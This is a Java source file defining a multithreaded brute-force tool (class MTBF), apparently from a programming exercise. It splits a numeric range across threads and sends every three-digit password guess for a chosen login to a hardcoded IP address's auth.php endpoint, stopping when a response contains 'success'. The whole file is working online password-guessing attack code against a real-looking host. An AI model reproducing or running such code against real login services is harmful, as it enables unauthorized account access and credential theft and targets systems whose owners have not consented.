package def;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class MTBF {
	private String LOGIN;						// Login
	private int RANGE_START;					// range start
	private int RANGE_END;						// range end
	private int THREADS;						// number of threads
	private String pass;						// found password
	private boolean stopThreadFlag = false;		// boolean to stop the threads
	private int passwordCounter=0;				// counter of checked passwords
	private String result="";					// string with BF results
	
	/*
	 * help class to build
	 */
	public static class Builder {
		private String LOGIN = new String();
		private int RANGE_START;
		private int RANGE_END;
		private int THREADS;
		
		public Builder () {}
		
		public Builder LOGIN(String LOGIN) {
            this.LOGIN = LOGIN;
            return this;
        }
		public Builder RANGE_START(int RANGE_START) {
            this.RANGE_START = RANGE_START;
            return this;
        }
		public Builder RANGE_END(int RANGE_END) {
            this.RANGE_END = RANGE_END;
            return this;
        }
		public Builder THREADS(int THREADS) {
            this.THREADS = THREADS;
            return this;
        }
		
		public MTBF build() {
			return new MTBF(LOGIN, RANGE_START,
					RANGE_END, THREADS);
		}
		
		
		
	}
		public MTBF(String LOGIN,
				int RANGE_START,
				int RANGE_END,
				int THREADS
				){
			this.LOGIN = LOGIN;
			this.RANGE_START = RANGE_START;
			this.RANGE_END = RANGE_END;
			this.THREADS = THREADS;
		}
		
/**
 * multiThreadBrute()
 * @throws InterruptedException
 * @throws ExecutionException
 */
	    private void multiThreadBrute() throws InterruptedException, ExecutionException{
	    	int threads = THREADS;
	    	double total_length = (RANGE_END - RANGE_START);
	    	double subrange_length = total_length/threads;
	    	ExecutorService service = Executors.newFixedThreadPool(threads);
	    	double current_start = RANGE_START;
	    	for (int i = 0; i < threads; ++i) {
	    		final int start = (int) current_start;
	    		final int end = (int) (current_start + subrange_length);
	    		final int threadID = i;
	        service.execute(new Runnable() {
	            @Override
	            public void run() {
	            	// if theres is a range of 1 number and few threads so all threads but the last will check for same start and end numbers
	            	if(threadID == 0 || start == end || start+1 == end){
	            		updateResultString("Thread: "+ threadID + "	Start: "+ start + "	End: "+(end)+"\n");
	            		threadBrute(start, end);
	            	} else {
	            		updateResultString("Thread: "+ threadID + "	Start: "+ (start+1) + "	End: "+(end)+"\n");
	            		threadBrute(start+1, end);
	            	}
	            }
	        });
	        current_start = (current_start+subrange_length);
	    }
	    service.shutdown();

	    try {
	        service.awaitTermination(Long.MAX_VALUE, TimeUnit.NANOSECONDS);
	    } catch (InterruptedException e) {
	        System.out.println("multiThreadBrute() interrupted: " + e.getMessage());
	    }
	    if(getPass() == null)
	    	updateResultString("Did not find a match\n");
	    }
		
	    /**
	     * threadBrute 
	     * @param start
	     * @param end
	     * 
	     * Checks the password for each number of selected range and detects the answer
	     */
	    private void threadBrute(int start, int end){
	        for (int i = start; i <= end && !getThreadsFlag(); i++) {
				try{
					// format the string
					String formattedPassword = String.format("%03d", i);
					// set url
					String loginurl = "http://212.143.244.206/auth.php?username=" + LOGIN + "&password=" + formattedPassword;
					URL url = new URL(loginurl);
					HttpURLConnection connection = (HttpURLConnection)url.openConnection();
					BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
					
					StringBuilder response = new StringBuilder();
					StringBuilder result = new StringBuilder();
					String inputLine;
					// check if server response contains "success"
					while ((inputLine = in.readLine()) != null){
						if(inputLine.contains("success"))
							result.append("success");
						response.append(inputLine);
					}
					in.close();
					// increase passwords counter
					increaseCounter();
					// if found matching password, update the result string
					if(result.toString().equals("success")){
						updateResultString("Login: "+LOGIN+"	Password: "+formattedPassword+"	Result: success"+"\n");
						setPass(formattedPassword);
						if(getPass() != null){
							updateResultString("Right password: "+getPass()+"\nTried passwords: " + getCounter()+"\n");
						}
						// stop the treads
						stopThreads();
					}
					} catch (Exception e){
						updateResultString("connect exception: "+e.getMessage());
					}
	        	
	        	
	        	
	        }

	    }
	    /**
	     * increaseCounter()
	     */
		private void increaseCounter(){
			synchronized(this){
			this.passwordCounter = this.passwordCounter + 1;
			}
		}
		/**
		 * getCounter()
		 * @return passwordCounter
		 */
		public int getCounter(){
			synchronized(this){
			return this.passwordCounter;
			}
		}
		/**
		 * getResult() returns the result string
		 * @return result
		 */
		public String getResult(){
			synchronized(this){
			return this.result;
			}
		}
		/**
		 * returns found password
		 * @return pass
		 */
		public String getPass(){
			synchronized(this){
			return this.pass;
			}
		}
		/**
		 * setPass
		 * @param pass
		 */
		private void setPass(String pass){
			synchronized(this){
			this.pass = pass;
			}
		}
		/**
		 * Stop running threads
		 */
		public void stopThreads(){
			synchronized(this){
			this.stopThreadFlag = true;
			}
		}
		/**
		 * gets the threads running boolean
		 * @return stopThreadFlag
		 */
		public boolean getThreadsFlag(){
			synchronized(this){
			return this.stopThreadFlag;
			}
		}
		/**
		 * sets threads number
		 * @param x
		 */
		public void setThreadsNumber(int x){
			this.THREADS = x;
		}
		/**
		 * Update results string
		 * @param str
		 */
		private void updateResultString(String str){
			synchronized(this){
				this.result=this.result+str;
			}
		}
		/**
		 * execute multiThreadBrute()
		 */
		public void run(){
			try {
				multiThreadBrute();
		    } catch (InterruptedException  e) {
		    	updateResultString("interrupted\n");
		        e.printStackTrace();
		    } catch (ExecutionException e) {
		    	updateResultString("interrupted\n");
		        e.printStackTrace();
		    }
		}
}
